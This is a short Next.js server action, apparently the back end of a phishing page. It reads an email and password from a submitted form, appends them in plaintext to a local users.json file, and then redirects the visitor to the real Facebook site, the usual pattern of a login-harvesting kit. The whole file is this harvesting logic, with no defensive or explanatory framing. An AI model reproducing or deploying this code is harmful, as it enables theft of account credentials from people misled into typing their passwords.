import { redirect, RedirectType } from 'next/navigation';
import fs from 'fs';
import { FORM_ELEMENT_NAME } from '@/form';

const PATH = './data/users.json';
const ENCODING = 'utf-8';
const REDIRECT_TO = 'https://www.facebook.com/';

export async function saveUser(formData: FormData) {
  'use server';

  const rawFormData = {
    email: formData.get(FORM_ELEMENT_NAME.EMAIL),
    password: formData.get(FORM_ELEMENT_NAME.PASSWORD),
  };

  fs.readFile(PATH, { encoding: ENCODING }, (_e, data) => {
    let parsedData = null;

    try {
      parsedData = JSON.parse(data);
    } catch {}

    const newData = Array.isArray(parsedData)
      ? [...parsedData, rawFormData]
      : [rawFormData];
    fs.writeFile(PATH, JSON.stringify(newData), () => 0);
  });

  redirect(REDIRECT_TO, RedirectType.push);
}
